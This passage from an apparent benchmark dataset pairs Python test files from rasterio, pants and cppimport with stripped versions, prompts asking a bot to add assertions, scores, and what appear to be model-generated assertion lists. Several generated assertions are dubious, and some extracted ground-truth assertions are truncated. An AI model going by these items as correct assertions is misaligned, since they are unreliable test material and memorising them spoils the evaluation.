3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['rm', 'gm', 'bm', 'r', 'g', 'b', 'tmpdir', 'kwds', 'mask', 'tiffs', 'filename', 'rgb', 'masks']
*Code:

1import logging
2import sys
3
4import numpy as np
5from pytest import fixture
6
7import rasterio
8
9
10logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)
11
12
13def test_masks():
14    with rasterio.open('tests/data/RGB.byte.tif') as src:
15        rm, gm, bm = src.read_masks()
16        r, g, b = src.read(masked=False)
17
18
19def test_masked_true():
20    with rasterio.open('tests/data/RGB.byte.tif') as src:
21        r, g, b = src.read(masked=True)
22        rm, gm, bm = src.read_masks()
23
24
25def test_masked_none():
26    with rasterio.open('tests/data/RGB.byte.tif') as src:
27        r, g, b = src.read(masked=True)
28        rm, gm, bm = src.read_masks()
29
30
31@fixture(scope='function')
32def tiffs(tmpdir):
33    with rasterio.open('tests/data/RGB.byte.tif') as src:
34        kwds = src.meta
35        
36        del kwds['nodata']
37        with rasterio.open(
38                str(tmpdir.join('no-nodata.tif')), 'w',
39                **kwds) as dst:
40            dst.write(src.read(masked=False))
41
42        with rasterio.open(
43                str(tmpdir.join('sidecar-masked.tif')), 'w',
44                **kwds) as dst:
45            dst.write(src.read(masked=False))
46            mask = np.zeros(src.shape, dtype='uint8')
47            dst.write_mask(mask)
48
49    return tmpdir
50
51
52def test_masking_no_nodata(tiffs):
53    # if the dataset has no defined nodata values, all data is
54    # considered valid data. The GDAL masks bands are arrays of
55    # 255 values. ``read()`` returns masked arrays where `mask`
56    # is False.
57    filename = str(tiffs.join('no-nodata.tif'))
58    with rasterio.open(filename) as src:
59
60        rgb = src.read(masked=False)
61        r = src.read(1, masked=False)
62
63        rgb = src.read(masked=True)
64        r = src.read(1, masked=True)
65
66        rgb = src.read(masked=True)
67        r = src.read(1, masked=True)
68
69        masks = src.read_masks()
70
71
72def test_masking_sidecar_mask(tiffs):
73    # If the dataset has a .msk sidecar mask band file, all masks will
74    # be derived from that file.
75    with rasterio.open(str(tiffs.join('sidecar-masked.tif'))) as src:
76        rgb = src.read(masked=True)
77        r = src.read(1, masked=True)
78        masks = src.read_masks()
79",3772,"[[15, 'rm', '==', 'gm', 'Asserting that the red and green masks are of the same size'],
[15, 'rm', '==', 'bm', 'Asserting that the red and blue masks are of the same size'],
[16, 'r', '==', 'g', 'Asserting that the red and green image arrays are of the same size'],
[16, 'r', '==', 'b', 'Asserting that the red and blue image arrays are of the same size'],
[22, 'r', '==', 'g', 'Asserting that the red and green image arrays are of the same size'],
[22, 'r', '==', 'b', 'Asserting that the red and blue image arrays are of the same size'],
[28, 'r', '==', 'g', 'Asserting that the red and green image arrays are of the same size'],
[28, 'r', '==', 'b', 'Asserting that the red and blue image arrays are of the same size'],
[40, 'dst', '!=', 0, 'Asserting that the destination file is not empty after write operation'],
[47, 'mask', '==', 0, 'Asserting that mask is initialized to zeros'],
[60, 'rgb', '!=', 0, 'Asserting that the rgb image array is not empty'],
[61, 'r', '!=', 0, 'Asserting that the red image array is not empty'],
[76, 'rgb', '!=', 0, 'Asserting that the rgb image array is not empty'],
[77, 'r', '!=', 0, 'Asserting that the red image array is not empty']]"
pantsbuild/pants,"# Copyright 2018 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

import logging
from pathlib import Path

from pants.engine.internals import native_engine
from pants.init.logging import initialize_stdio
from pants.testutil.option_util import create_options_bootstrapper
from pants.testutil.rule_runner import mock_console
from pants.util.contextutil import temporary_dir
from pants.util.logging import LogLevel


def test_file_logging() -> None:
    with temporary_dir() as tmpdir:
        ob = create_options_bootstrapper([f""--pants-workdir={tmpdir}""])

        # Do not set up a stdio destination, meaning that all messages will go to the log.
        global_bootstrap_options = ob.bootstrap_options.for_global_scope()
        with initialize_stdio(global_bootstrap_options):
            logger = logging.getLogger(None)

            cat = ""🐈""
            logger.warning(""this is a warning"")
            logger.info(""this is some info"")
            logger.debug(""this is some debug info"")
            logger.info(f""unicode: {cat}"")

            loglines = (
                Path(global_bootstrap_options.pants_workdir, ""pants.log"").read_text().splitlines()
            )
            print(loglines)
            assert len(loglines) == 3
            assert ""[WARN] this is a warning"" in loglines[0]
            assert ""[INFO] this is some info"" in loglines[1]
            assert f""[INFO] unicode: {cat}"" in loglines[2]


def test_log_filtering_by_rule() -> None:
    with temporary_dir() as tmpdir:
        ob = create_options_bootstrapper(
            [f""--pants-workdir={tmpdir}"", '--log-levels-by-target={""debug_target"": ""debug""}']
        )

        # Do not set up a stdio destination, meaning that all messages will go to the log.
        global_bootstrap_options = ob.bootstrap_options.for_global_scope()
        with initialize_stdio(global_bootstrap_options):
            native_engine.write_log(
                msg=""log msg one"", level=LogLevel.INFO.level, target=""some.target""
            )
            native_engine.write_log(
                msg=""log msg two"", level=LogLevel.DEBUG.level, target=""some.other.target""
            )
            native_engine.write_log(
                msg=""log msg three"", level=LogLevel.DEBUG.level, target=""debug_target""
            )

            loglines = (
                Path(global_bootstrap_options.pants_workdir, ""pants.log"").read_text().splitlines()
            )

            assert ""[INFO] log msg one"" in loglines[0]
            assert ""[DEBUG] log msg three"" in loglines[1]
            assert len(loglines) == 2


def test_stdin_input() -> None:
    ob = create_options_bootstrapper([])
    expected_input = ""my_input""
    expected_output = ""my_output""
    with mock_console(ob, stdin_content=f""{expected_input}\n"") as (_, stdio_reader):
        assert expected_input == input(expected_output)
        assert expected_output == stdio_reader.get_stdout()

    with mock_console(ob, stdin_content=f""{expected_input}\n"") as (console, stdio_reader):
        assert expected_input == console.input(expected_output)
        assert expected_output == stdio_reader.get_stdout()
","
1# Copyright 2018 Pants project contributors (see CONTRIBUTORS.md).
2# Licensed under the Apache License, Version 2.0 (see LICENSE).
3
4import logging
5from pathlib import Path
6
7from pants.engine.internals import native_engine
8from pants.init.logging import initialize_stdio
9from pants.testutil.option_util import create_options_bootstrapper
10from pants.testutil.rule_runner import mock_console
11from pants.util.contextutil import temporary_dir
12from pants.util.logging import LogLevel
13
14
15def test_file_logging() -> None:
16    with temporary_dir() as tmpdir:
17        ob = create_options_bootstrapper([f""--pants-workdir={tmpdir}""])
18
19        # Do not set up a stdio destination, meaning that all messages will go to the log.
20        global_bootstrap_options = ob.bootstrap_options.for_global_scope()
21        with initialize_stdio(global_bootstrap_options):
22            logger = logging.getLogger(None)
23
24            cat = ""🐈""
25            logger.warning(""this is a warning"")
26            logger.info(""this is some info"")
27            logger.debug(""this is some debug info"")
28            logger.info(f""unicode: {cat}"")
29
30            loglines = (
31                Path(global_bootstrap_options.pants_workdir, ""pants.log"").read_text().splitlines()
32            )
33            print(loglines)
34
35
36def test_log_filtering_by_rule() -> None:
37    with temporary_dir() as tmpdir:
38        ob = create_options_bootstrapper(
39            [f""--pants-workdir={tmpdir}"", '--log-levels-by-target={""debug_target"": ""debug""}']
40        )
41
42        # Do not set up a stdio destination, meaning that all messages will go to the log.
43        global_bootstrap_options = ob.bootstrap_options.for_global_scope()
44        with initialize_stdio(global_bootstrap_options):
45            native_engine.write_log(
46                msg=""log msg one"", level=LogLevel.INFO.level, target=""some.target""
47            )
48            native_engine.write_log(
49                msg=""log msg two"", level=LogLevel.DEBUG.level, target=""some.other.target""
50            )
51            native_engine.write_log(
52                msg=""log msg three"", level=LogLevel.DEBUG.level, target=""debug_target""
53            )
54
55            loglines = (
56                Path(global_bootstrap_options.pants_workdir, ""pants.log"").read_text().splitlines()
57            )
58
59
60
61def test_stdin_input() -> None:
62    ob = create_options_bootstrapper([])
63    expected_input = ""my_input""
64    expected_output = ""my_output""
65    with mock_console(ob, stdin_content=f""{expected_input}\n"") as (_, stdio_reader):
66
67    with mock_console(ob, stdin_content=f""{expected_input}\n"") as (console, stdio_reader):
68","[['len(loglines)', '==', '3'], ['len(loglines)', '==', '2'], ['expected_input', '==', 'input(expected_output)'], ['expected_output', '==', 'stdio_reader.get_stdout()'], ['expected_input', '==', 'console.input(expected_output)'], ['expected_output', '==', 'stdio_reader.get_stdout()']]",11,6,0.5454545454545454,0.0018755861206627,"['ob', 'global_bootstrap_options', 'logger', 'cat', 'loglines', 'expected_input', 'expected_output']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['ob', 'global_bootstrap_options', 'logger', 'cat', 'loglines', 'expected_input', 'expected_output']
*Code:

1# Copyright 2018 Pants project contributors (see CONTRIBUTORS.md).
2# Licensed under the Apache License, Version 2.0 (see LICENSE).
3
4import logging
5from pathlib import Path
6
7from pants.engine.internals import native_engine
8from pants.init.logging import initialize_stdio
9from pants.testutil.option_util import create_options_bootstrapper
10from pants.testutil.rule_runner import mock_console
11from pants.util.contextutil import temporary_dir
12from pants.util.logging import LogLevel
13
14
15def test_file_logging() -> None:
16    with temporary_dir() as tmpdir:
17        ob = create_options_bootstrapper([f""--pants-workdir={tmpdir}""])
18
19        # Do not set up a stdio destination, meaning that all messages will go to the log.
20        global_bootstrap_options = ob.bootstrap_options.for_global_scope()
21        with initialize_stdio(global_bootstrap_options):
22            logger = logging.getLogger(None)
23
24            cat = ""🐈""
25            logger.warning(""this is a warning"")
26            logger.info(""this is some info"")
27            logger.debug(""this is some debug info"")
28            logger.info(f""unicode: {cat}"")
29
30            loglines = (
31                Path(global_bootstrap_options.pants_workdir, ""pants.log"").read_text().splitlines()
32            )
33            print(loglines)
34
35
36def test_log_filtering_by_rule() -> None:
37    with temporary_dir() as tmpdir:
38        ob = create_options_bootstrapper(
39            [f""--pants-workdir={tmpdir}"", '--log-levels-by-target={""debug_target"": ""debug""}']
40        )
41
42        # Do not set up a stdio destination, meaning that all messages will go to the log.
43        global_bootstrap_options = ob.bootstrap_options.for_global_scope()
44        with initialize_stdio(global_bootstrap_options):
45            native_engine.write_log(
46                msg=""log msg one"", level=LogLevel.INFO.level, target=""some.target""
47            )
48            native_engine.write_log(
49                msg=""log msg two"", level=LogLevel.DEBUG.level, target=""some.other.target""
50            )
51            native_engine.write_log(
52                msg=""log msg three"", level=LogLevel.DEBUG.level, target=""debug_target""
53            )
54
55            loglines = (
56                Path(global_bootstrap_options.pants_workdir, ""pants.log"").read_text().splitlines()
57            )
58
59
60
61def test_stdin_input() -> None:
62    ob = create_options_bootstrapper([])
63    expected_input = ""my_input""
64    expected_output = ""my_output""
65    with mock_console(ob, stdin_content=f""{expected_input}\n"") as (_, stdio_reader):
66
67    with mock_console(ob, stdin_content=f""{expected_input}\n"") as (console, stdio_reader):
68",4197,"[[16, 'tmpdir', '!=', None, 'temporary directory should be created and not be None to ensure file operations'],
[17, 'ob', '!=', None, 'Options bootstrapper should be created successfully'],
[22, 'logger', '!=', None, 'Logger needs to be initialized to log events'],
[24, 'cat', '!=', None, 'cat used to display unicode should be non-empty'],
[32, 'loglines', '!=', None, 'Read log lines should not be None'],
[37, 'tmpdir', '!=', None, 'temporary directory should be created and not be None to ensure file operations'],
[38, 'ob', '!=', None, 'Options bootstrapper should be created successfully'],
[43, 'global_bootstrap_options', '!=', None, 'Bootstrap options should have been loaded'],
[56, 'loglines', '!=', None, 'Read log lines should not be None'],
[62, 'ob', '!=', None, 'Options bootstrapper should be created successfully'],
[63, 'expected_input', '!=', None, 'Expected input should not be None'],
[64, 'expected_output', '!=', None, 'Expected output should not be None'],
[66, 'stdio_reader', '!=', None, 'Stdio reader should be initialized'],
[67, 'console', '!=', None, 'Console should be initialized'],
[68, 'stdio_reader', '!=', None, 'Stdio reader should be initialized']]"
tbenthompson/cppimport,"import contextlib
import copy
import logging
import os
import shutil
import subprocess
import sys
from multiprocessing import Process
from tempfile import TemporaryDirectory

import cppimport
import cppimport.build_module
import cppimport.templating
from cppimport.find import find_module_cpppath

root_logger = logging.getLogger()
root_logger.setLevel(logging.DEBUG)

handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.DEBUG)
formatter = logging.Formatter(""%(asctime)s - %(name)s - %(levelname)s - %(message)s"")
handler.setFormatter(formatter)
root_logger.addHandler(handler)


@contextlib.contextmanager
def appended(filename, text):
    with open(filename, ""r"") as f:
        orig = f.read()
    with open(filename, ""a"") as f:
        f.write(text)
    try:
        yield
    finally:
        with open(filename, ""w"") as f:
            f.write(orig)


def subprocess_check(test_code, returncode=0):
    p = subprocess.run(
        [sys.executable, ""-c"", test_code],
        cwd=os.path.dirname(__file__),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if len(p.stdout) > 0:
        print(p.stdout.decode(""utf-8""))
    if len(p.stderr) > 0:
        print(p.stderr.decode(""utf-8""))
    assert p.returncode == returncode


@contextlib.contextmanager
def tmp_dir(files=None):
    """"""Create a temporary directory and copy `files` into it. `files` can also
    include directories.""""""
    files = files if files else []

    with TemporaryDirectory() as tmp_path:
        for f in files:
            if os.path.isdir(f):
                shutil.copytree(f, os.path.join(tmp_path, os.path.basename(f)))
            else:
                shutil.copyfile(f, os.path.join(tmp_path, os.path.basename(f)))
        yield tmp_path


def test_find_module_cpppath():
    mymodule_loc = find_module_cpppath(""mymodule"")
    mymodule_dir = os.path.dirname(mymodule_loc)
    assert os.path.basename(mymodule_loc) == ""mymodule.cpp""

    apackage = find_module_cpppath(""apackage.mymodule"")
    apackage_correct = os.path.join(mymodule_dir, ""apackage"", ""mymodule.cpp"")
    assert apackage == apackage_correct

    inner = find_module_cpppath(""apackage.inner.mymodule"")
    inner_correct = os.path.join(mymodule_dir, ""apackage"", ""inner"", ""mymodule.cpp"")
    assert inner == inner_correct


def test_get_rendered_source_filepath():
    rendered_path = cppimport.templating.get_rendered_source_filepath(""abc.cpp"")
    assert rendered_path == "".rendered.abc.cpp""


def module_tester(mod, cheer=False):
    assert mod.add(1, 2) == 3
    if cheer:
        mod.Thing().cheer()


def test_mymodule():
    mymodule = cppimport.imp(""mymodule"")
    module_tester(mymodule)


def test_mymodule_build():
    cppimport.build(""mymodule"")
    import mymodule

    module_tester(mymodule)


def test_mymodule_from_filepath():
    mymodule = cppimport.imp_from_filepath(""tests/mymodule.cpp"")
    module_tester(mymodule)


def test_package_mymodule():
    mymodule = cppimport.imp(""apackage.mymodule"")
    module_tester(mymodule)


def test_inner_package_mymodule():
    mymodule = cppimport.imp(""apackage.inner.mymodule"")
    module_tester(mymodule)


def test_with_file_in_syspath():
    orig_sys_path = copy.copy(sys.path)
    sys.path.append(os.path.join(os.path.dirname(__file__), ""mymodule.cpp""))
    cppimport.imp(""mymodule"")
    sys.path = orig_sys_path


def test_rebuild_after_failed_compile():
    cppimport.imp(""mymodule"")
    test_code = """"""
import cppimport; mymodule = cppimport.imp(""mymodule"");assert(mymodule.add(1,2) == 3)
""""""
    with appended(""tests/mymodule.cpp"", "";asdf;""):
        subprocess_check(test_code, 1)
    subprocess_check(test_code, 0)


add_to_thing = """"""
#include <iostream>
struct Thing {
    void cheer() {
        std::cout << ""WAHHOOOO"" << std::endl;
    }
};
#define THING_DEFINED
""""""


def test_no_rebuild_if_no_deps_change():
    cppimport.imp(""mymodule"")
    test_code = """"""
import cppimport;
mymodule = cppimport.imp(""mymodule"");
assert(not hasattr(mymodule, 'Thing'))
""""""
    with appended(""tests/thing2.h"", add_to_thing):
        subprocess_check(test_code)


def test_rebuild_header_after_change():
    cppimport.imp(""mymodule"")
    test_code = """"""
import cppimport;
mymodule = cppimport.imp(""mymodule"");
mymodule.Thing().cheer()
""""""
    with appended(""tests/thing.h"", add_to_thing):
        subprocess_check(test_code)
    assert open(""tests/thing.h"", ""r"").read() == """"


def test_raw_extensions():
    raw_extension = cppimport.imp(""raw_extension"")
    assert raw_extension.add(1, 2) == 3


def test_extra_sources_and_parallel():
    cppimport.settings[""force_rebuild""] = True
    mod = cppimport.imp(""extra_sources"")
    cppimport.settings[""force_rebuild""] = False
    assert mod.square_sum(3, 4) == 25


def test_import_hook():
    import cppimport.import_hook

    # Force rebuild to make sure we're not just reloading the already compiled
    # module from disk
    cppimport.force_rebuild(True)
    import hook_test

    cppimport.force_rebuild(False)
    assert hook_test.sub(3, 1) == 2


def test_submodule_import_hook():
    import cppimport.import_hook

    # Force rebuild to make sure we're not just reloading the already compiled
    # module from disk
    cppimport.force_rebuild(True)
    import apackage.mymodule

    cppimport.force_rebuild(False)
    assert apackage.mymodule.add(3, 1) == 4


def test_relative_import():
    import cppimport.import_hook

    cppimport.force_rebuild(True)
    from apackage.rel_import_tester import f

    cppimport.force_rebuild(False)
    print(f())
    assert f() == 3


def test_multiple_processes():
    with tmp_dir([""tests/hook_test.cpp""]) as tmp_path:
        test_code = f""""""
import os;
os.chdir('{tmp_path}');
import cppimport.import_hook;
import hook_test;
        """"""
        processes = [
            Process(target=subprocess_check, args=(test_code,)) for i in range(100)
        ]

        for p in processes:
            p.start()

        for p in processes:
            p.join()

        assert all(p.exitcode == 0 for p in processes)
","
1import contextlib
2import copy
3import logging
4import os
5import shutil
6import subprocess
7import sys
8from multiprocessing import Process
9from tempfile import TemporaryDirectory
10
11import cppimport
12import cppimport.build_module
13import cppimport.templating
14from cppimport.find import find_module_cpppath
15
16root_logger = logging.getLogger()
17root_logger.setLevel(logging.DEBUG)
18
19handler = logging.StreamHandler(sys.stdout)
20handler.setLevel(logging.DEBUG)
21formatter = logging.Formatter(""%(asctime)s - %(name)s - %(levelname)s - %(message)s"")
22handler.setFormatter(formatter)
23root_logger.addHandler(handler)
24
25
26@contextlib.contextmanager
27def appended(filename, text):
28    with open(filename, ""r"") as f:
29        orig = f.read()
30    with open(filename, ""a"") as f:
31        f.write(text)
32    try:
33        yield
34    finally:
35        with open(filename, ""w"") as f:
36            f.write(orig)
37
38
39def subprocess_check(test_code, returncode=0):
40    p = subprocess.run(
41        [sys.executable, ""-c"", test_code],
42        cwd=os.path.dirname(__file__),
43        stdout=subprocess.PIPE,
44        stderr=subprocess.PIPE,
45    )
46    if len(p.stdout) > 0:
47        print(p.stdout.decode(""utf-8""))
48    if len(p.stderr) > 0:
49        print(p.stderr.decode(""utf-8""))
50
51
52@contextlib.contextmanager
53def tmp_dir(files=None):
54    """"""Create a temporary directory and copy `files` into it. `files` can also
55    include directories.""""""
56    files = files if files else []
57
58    with TemporaryDirectory() as tmp_path:
59        for f in files:
60            if os.path.isdir(f):
61                shutil.copytree(f, os.path.join(tmp_path, os.path.basename(f)))
62            else:
63                shutil.copyfile(f, os.path.join(tmp_path, os.path.basename(f)))
64        yield tmp_path
65
66
67def test_find_module_cpppath():
68    mymodule_loc = find_module_cpppath(""mymodule"")
69    mymodule_dir = os.path.dirname(mymodule_loc)
70
71    apackage = find_module_cpppath(""apackage.mymodule"")
72    apackage_correct = os.path.join(mymodule_dir, ""apackage"", ""mymodule.cpp"")
73
74    inner = find_module_cpppath(""apackage.inner.mymodule"")
75    inner_correct = os.path.join(mymodule_dir, ""apackage"", ""inner"", ""mymodule.cpp"")
76
77
78def test_get_rendered_source_filepath():
79    rendered_path = cppimport.templating.get_rendered_source_filepath(""abc.cpp"")
80
81
82def module_tester(mod, cheer=False):
83    if cheer:
84        mod.Thing().cheer()
85
86
87def test_mymodule():
88    mymodule = cppimport.imp(""mymodule"")
89    module_tester(mymodule)
90
91
92def test_mymodule_build():
93    cppimport.build(""mymodule"")
94    import mymodule
95
96    module_tester(mymodule)
97
98
99def test_mymodule_from_filepath():
100    mymodule = cppimport.imp_from_filepath(""tests/mymodule.cpp"")
101    module_tester(mymodule)
102
103
104def test_package_mymodule():
105    mymodule = cppimport.imp(""apackage.mymodule"")
106    module_tester(mymodule)
107
108
109def test_inner_package_mymodule():
110    mymodule = cppimport.imp(""apackage.inner.mymodule"")
111    module_tester(mymodule)
112
113
114def test_with_file_in_syspath():
115    orig_sys_path = copy.copy(sys.path)
116    sys.path.append(os.path.join(os.path.dirname(__file__), ""mymodule.cpp""))
117    cppimport.imp(""mymodule"")
118    sys.path = orig_sys_path
119
120
121def test_rebuild_after_failed_compile():
122    cppimport.imp(""mymodule"")
123    test_code = """"""
124""""""
125    with appended(""tests/mymodule.cpp"", "";asdf;""):
126        subprocess_check(test_code, 1)
127    subprocess_check(test_code, 0)
128
129
130add_to_thing = """"""
131#include <iostream>
132struct Thing {
133    void cheer() {
134        std::cout << ""WAHHOOOO"" << std::endl;
135    }
136};
137#define THING_DEFINED
138""""""
139
140
141def test_no_rebuild_if_no_deps_change():
142    cppimport.imp(""mymodule"")
143    test_code = """"""
144import cppimport;
145mymodule = cppimport.imp(""mymodule"");
146""""""
147    with appended(""tests/thing2.h"", add_to_thing):
148        subprocess_check(test_code)
149
150
151def test_rebuild_header_after_change():
152    cppimport.imp(""mymodule"")
153    test_code = """"""
154import cppimport;
155mymodule = cppimport.imp(""mymodule"");
156mymodule.Thing().cheer()
157""""""
158    with appended(""tests/thing.h"", add_to_thing):
159        subprocess_check(test_code)
160
161
162def test_raw_extensions():
163    raw_extension = cppimport.imp(""raw_extension"")
164
165
166def test_extra_sources_and_parallel():
167    cppimport.settings[""force_rebuild""] = True
168    mod = cppimport.imp(""extra_sources"")
169    cppimport.settings[""force_rebuild""] = False
170
171
172def test_import_hook():
173    import cppimport.import_hook
174
175    # Force rebuild to make sure we're not just reloading the already compiled
176    # module from disk
177    cppimport.force_rebuild(True)
178    import hook_test
179
180    cppimport.force_rebuild(False)
181
182
183def test_submodule_import_hook():
184    import cppimport.import_hook
185
186    # Force rebuild to make sure we're not just reloading the already compiled
187    # module from disk
188    cppimport.force_rebuild(True)
189    import apackage.mymodule
190
191    cppimport.force_rebuild(False)
192
193
194def test_relative_import():
195    import cppimport.import_hook
196
197    cppimport.force_rebuild(True)
198    from apackage.rel_import_tester import f
199
200    cppimport.force_rebuild(False)
201    print(f())
202
203
204def test_multiple_processes():
205    with tmp_dir([""tests/hook_test.cpp""]) as tmp_path:
206        test_code = f""""""
207import os;
208os.chdir('{tmp_path}');
209import cppimport.import_hook;
210import hook_test;
211        """"""
212        processes = [
213            Process(target=subprocess_check, args=(test_code,)) for i in range(100)
214        ]
215
216        for p in processes:
217            p.start()
218
219        for p in processes:
220            p.join()
221
222","[['p.returncode', '==', 'returncode'], ['os.path.basename(mymodule_loc)', '==', '""mymodule.cpp""'], ['apackage', '==', 'apackage_correct'], ['inner', '==', 'inner_correct'], ['rendered_path', '==', '"".rendered.abc.cpp""'], ['mod.add(1', '==', 'True'], ['open(""tests/thing.h""', '==', 'True'], ['raw_extension.add(1', '==', 'True'], ['mod.square_sum(3', '==', 'True'], ['hook_test.sub(3', '==', 'True'], ['apackage.mymodule.add(3', '==', 'True'], ['f()', '==', '3']]",15,12,0.8,0.0019808517662594,"['root_logger', 'handler', 'formatter', 'filename', 'text', 'orig', 'test_code', 'returncode', 'p', 'files', 'mymodule_loc', 'mymodule_dir', 'apackage', 'apackage_correct', 'inner', 'inner_correct', 'rendered_path', 'mod', 'cheer', 'mymodule', 'orig_sys_path', 'sys.path', 'import cppimport; mymodule', 'add_to_thing', 'raw_extension', 'cppimport.settings[""force_rebuild""]', 'processes']",27,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['root_logger', 'handler', 'formatter', 'filename', 'text', 'orig', 'test_code', 'returncode', 'p', 'files', 'mymodule_loc', 'mymodule_dir', 'apackage', 'apackage_correct', 'inner', 'inner_correct', 'rendered_path', 'mod', 'cheer', 'mymodule', 'orig_sys_path', 'sys.path', 'import cppimport; mymodule', 'add_to_thing', 'raw_extension', 'cppimport.settings[""force_rebuild""]', 'processes']
*Code:

1import contextlib
2import copy
3import logging
4import os
5import shutil
6import subprocess
7import sys
8from multiprocessing import Process
9from tempfile import TemporaryDirectory
10
11import cppimport
12import cppimport.build_module
13import cppimport.templating
14from cppimport.find import find_module_cpppath
15
16root_logger = logging.getLogger()
17root_logger.setLevel(logging.DEBUG)
18
19handler = logging.StreamHandler(sys.stdout)
20handler.setLevel(logging.DEBUG)
21formatter = logging.Formatter(""%(asctime)s - %(name)s - %(levelname)s - %(message)s"")
22handler.setFormatter(formatter)
23root_logger.addHandler(handler)
24
25
26@contextlib.contextmanager
27def appended(filename, text):
28    with open(filename, ""r"") as f:
29        orig = f.read()
30    with open(filename, ""a"") as f:
31        f.write(text)
32    try:
33        yield
34    finally:
35        with open(filename, ""w"") as f:
36            f.write(orig)
37
38
39def subprocess_check(test_code, returncode=0):
40    p = subprocess.run(
41        [sys.executable, ""-c"", test_code],
42        cwd=os.path.dirname(__file__),
43        stdout=subprocess.PIPE,
44        stderr=subprocess.PIPE,
45    )
46    if len(p.stdout) > 0:
47        print(p.stdout.decode(""utf-8""))
48    if len(p.stderr) > 0:
49        print(p.stderr.decode(""utf-8""))
50
51
52@contextlib.contextmanager
53def tmp_dir(files=None):
54    """"""Create a temporary directory and copy `files` into it. `files` can also
55    include directories.""""""
56    files = files if files else []
57
58    with TemporaryDirectory() as tmp_path:
59        for f in files:
60            if os.path.isdir(f):
61                shutil.copytree(f, os.path.join(tmp_path, os.path.basename(f)))
62            else:
63                shutil.copyfile(f, os.path.join(tmp_path, os.path.basename(f)))
64        yield tmp_path
65
66
67def test_find_module_cpppath():
68    mymodule_loc = find_module_cpppath(""mymodule"")
69    mymodule_dir = os.path.dirname(mymodule_loc)
70
71    apackage = find_module_cpppath(""apackage.mymodule"")
72    apackage_correct = os.path.join(mymodule_dir, ""apackage"", ""mymodule.cpp"")
73
74    inner = find_module_cpppath(""apackage.inner.mymodule"")
75    inner_correct = os.path.join(mymodule_dir, ""apackage"", ""inner"", ""mymodule.cpp"")
76
77
78def test_get_rendered_source_filepath():
79    rendered_path = cppimport.templating.get_rendered_source_filepath(""abc.cpp"")
80
81
82def module_tester(mod, cheer=False):
83    if cheer:
84        mod.Thing().cheer()
85
86
87def test_mymodule():
88    mymodule = cppimport.imp(""mymodule"")
89    module_tester(mymodule)
90
91
92def test_mymodule_build():
93    cppimport.build(""mymodule"")
94    import mymodule
95
96    module_tester(mymodule)
97
98
99def test_mymodule_from_filepath():
100    mymodule = cppimport.imp_from_filepath(""tests/mymodule.cpp"")
101    module_tester(mymodule)
102
103
104def test_package_mymodule():
105    mymodule = cppimport.imp(""apackage.mymodule"")
106    module_tester(mymodule)
107
108
109def test_inner_package_mymodule():
110    mymodule = cppimport.imp(""apackage.inner.mymodule"")
111    module_tester(mymodule)
112
113
114def test_with_file_in_syspath():
115    orig_sys_path = copy.copy(sys.path)
116    sys.path.append(os.path.join(os.path.dirname(__file__), ""mymodule.cpp""))
117    cppimport.imp(""mymodule"")
118    sys.path = orig_sys_path
119
120
121def test_rebuild_after_failed_compile():
122    cppimport.imp(""mymodule"")
123    test_code = """"""
124""""""
125    with appended(""tests/mymodule.cpp"", "";asdf;""):
126        subprocess_check(test_code, 1)
127    subprocess_check(test_code, 0)
128
129
130add_to_thing = """"""
131#include <iostream>
132struct Thing {
133    void cheer() {
134        std::cout << ""WAHHOOOO"" << std::endl;
135    }
136};
137#define THING_DEFINED
138""""""
139
140
141def test_no_rebuild_if_no_deps_change():
142    cppimport.imp(""mymodule"")
143    test_code = """"""
144import cppimport;
145mymodule = cppimport.imp(""mymodule"");
146""""""
147    with appended(""tests/thing2.h"", add_to_thing):
148        subprocess_check(test_code)
149
150
151def test_rebuild_header_after_change():
152    cppimport.imp(""mymodule"")
153    test_code = """"""
154import cppimport;
155mymodule = cppimport.imp(""mymodule"");
156mymodule.Thing().cheer()
157""""""
158    with appended(""tests/thing.h"", add_to_thing):
159        subprocess_check(test_code)
160
161
162def test_raw_extensions():
163    raw_extension = cppimport.imp(""raw_extension"")
164
165
166def test_extra_sources_and_parallel():
167    cppimport.settings[""force_rebuild""] = True
168    mod = cppimport.imp(""extra_sources"")
169    cppimport.settings[""force_rebuild""] = False
170
171
